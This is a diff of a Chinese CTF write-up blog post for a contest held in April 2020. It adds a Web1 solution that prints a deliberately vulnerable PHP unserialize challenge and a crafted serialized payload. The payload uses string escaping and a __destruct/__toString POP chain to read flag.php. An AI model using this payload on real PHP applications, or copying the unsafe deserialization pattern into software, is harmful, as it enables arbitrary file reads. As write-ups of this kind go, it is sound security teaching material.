@@ -80,11 +80,15 @@
           <div class="post-heading">
           	<span class="tags">
           	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
         </span>
             <h1>安恒四月月赛 WP</h1>
             <span class="meta">
             	Posted on
-              2020-04-25，1 min read
+              2020-04-25，3 min read
             </span>
           </div>
         </div>
@@ -141,6 +145,68 @@
 与akhb~chdaZrdaZudqduvdZvvv|比较<br>
 反向推一下就得到Flag<br>
 <img src="https://guokeya.github.io/post-images/1587812225018.png" alt="" loading="lazy"></p>
+<h1 id="centerwebcenter"><center>Web</center></h1>
+<h2 id="web1">Web1</h2>
+<p>给出了源码</p>
+<pre><code>&lt;?php
+show_source(&quot;index.php&quot;);
+function write($data) {
+    return str_replace(chr(0) . '*' . chr(0), '\0\0\0', $data);
+}
+
+function read($data) {
+    return str_replace('\0\0\0', chr(0) . '*' . chr(0), $data);
+}
+
+class A{
+    public $username;
+    public $password;
+    function __construct($a, $b){
+        $this-&gt;username = $a;
+        $this-&gt;password = $b;
+    }
+}
+
+class B{
+    public $b = 'gqy';
+    function __destruct(){
+        $c = 'a'.$this-&gt;b;
+        echo $c;
+    }
+}
+
+class C{
+    public $c;
+    function __toString(){
+        //flag.php
+        echo file_get_contents($this-&gt;c);
+        return 'nice';
+    }
+}
+
+$a = new A($_GET['a'],$_GET['b']);
+//省略了存储序列化数据的过程,下面是取出来并反序列化的操作
+$b = unserialize(read(write(serialize($a))));
+</code></pre>
+<p>本地开干<br>
+<img src="https://guokeya.github.io/post-images/1587813481970.png" alt="" loading="lazy"><br>
+这里输入三个\0\0\0。会被替换成一个chr(0).*.chr(0)<br>
+等于6个字符串。被替换为了3个字符串<br>
+明摆着逃逸+对象注入。。<br>
+得到逃逸的反序列化字符串<br>
+<img src="https://guokeya.github.io/post-images/1587813667407.png" alt="" loading="lazy"><br>
+然后我们需要构造如下的字符串</p>
+<pre><code>O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:3:&quot;xxx&quot;;s:8:&quot;password&quot;;payload;}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1587816054962.png" alt="" loading="lazy"></figure>
+<pre><code>O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:48:&quot;********&quot;;s:8:&quot;password&quot;;s:74:&quot;a&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}&quot;;}
+</code></pre>
+<p>注意。这里*两旁。是有<code>chr(0)</code>的。不可见字符<br>
+简化下就成了</p>
+<pre><code>O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:3:&quot;xxx&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}&quot;;}
+</code></pre>
+<p>Object对象。A。两个属性。第一个属性8个字符串。username。值为3个字符串xxx<br>
+password属性。值为Object对象B。然后XXXXPOP链</p>
 
           
           <p class="next-post">下一篇：
